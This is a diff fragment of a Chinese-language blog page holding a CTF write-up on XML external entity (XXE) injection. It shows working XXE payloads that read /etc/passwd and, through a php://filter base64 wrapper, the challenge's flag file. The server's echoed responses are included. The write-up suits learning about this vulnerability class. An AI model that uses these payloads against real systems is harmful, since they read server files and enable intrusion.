+<p><feedback><author>123</author><email><a href="mailto:1533360534@qq.com" target="_blank" rel="noopener">1533360534@qq.com</a></email><content>undefined</content></feedback><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">发现后端会将```&lt;author&gt;```标签中的元素回显，因此构造XXE需要在该标签中引用实体</span><br><span class="line"></span><br><span class="line">测试</span><br></pre></td></tr></table></figure></p>
+<p>&lt;!DOCTYPE a [&lt;!ENTITY ckf SYSTEM ‘file:///etc/passwd’&gt; ]&gt;</p>
+<p><feedback></feedback></p>
+<p><author>&ckf;</author><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">回显成功</span><br></pre></td></tr></table></figure></p>
+<p></p><h4>Thanks For you Feedback root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br>sync:x:4:65534:sync:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/bin/false<br>mysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/false<br>simple_user:x:1000:1000::/home/simple_user:/bin/bash<br>Debian-exim:x:102:102::/var/spool/exim4:/bin/false<br></h4><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">根据提示，猜测flag在```./flag```中，直接打开显示403 没有权限 </span><br><span class="line"></span><br><span class="line">构造XML外部实体</span><br></pre></td></tr></table></figure><p></p>
+<p>&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;<br>&lt;!DOCTYPE a [&lt;!ENTITY ckf SYSTEM ‘php://filter/convert.base64-encode/resource=flag’&gt; ]&gt;</p>
+<p><feedback><author>&ckf;</author><email><a href="mailto:1533360534@qq.com" target="_blank" rel="noopener">1533360534@qq.com</a></email><content>undefined</content></feedback><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">回显如下，base64解码即可得到flag</span><br></pre></td></tr></table></figure></p>
+<p></p><h4>Thanks For you Feedback U2VjdXJpbmV0c3tYeGVfeFhFX0BMbF9UaDNfV0BZfQo=</h4><br><code>`</code><p></p>
 
       
 
@@ -257,21 +266,6 @@
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">web</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
       
 
       
@@ -322,7 +316,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/07/08/web-四/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/03/29/XXE漏洞与伪协议/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -336,18 +330,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2018/07/09/Bin-四/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          Bin(四)
-        
-      </div>
-    </a>
   
-  
-    <a href="/2018/07/07/Pwn-一/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Pwn(一)</div>
+    <a href="/2019/03/09/HTML/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">HTML</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -374,7 +359,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS漏洞"><span class="toc-number">1.</span> <span class="toc-text">XSS漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#利用原理："><span class="toc-number">1.1.</span> <span class="toc-text">利用原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#危害："><span class="toc-number">1.2.</span> <span class="toc-text">危害：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分类："><span class="toc-number">1.3.</span> <span class="toc-text">分类：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#反射型XSS"><span class="toc-number">1.3.1.</span> <span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#储存型XSS"><span class="toc-number">1.3.2.</span> <span class="toc-text">储存型XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS盗用cookie登录"><span class="toc-number">1.4.</span> <span class="toc-text">XSS盗用cookie登录</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XML基础"><span class="toc-number">1.</span> <span class="toc-text">XML基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XML组成模块"><span class="toc-number">1.1.</span> <span class="toc-text">XML组成模块</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#undefined"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">Thanks For you Feedback root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/bin/falsemysql:x:101:101:MySQL Server,,,:/nonexistent:/bin/falsesimple_user:x:1000:1000::/home/simple_user:/bin/bashDebian-exim:x:102:102::/var/spool/exim4:/bin/false</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#undefined"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">Thanks For you Feedback U2VjdXJpbmV0c3tYeGVfeFhFX0BMbF9UaDNfV0BZfQo=</span></a></li></ol></li></ol></li></ol></li></ol>
                     </div>
                 </span>
             </div>
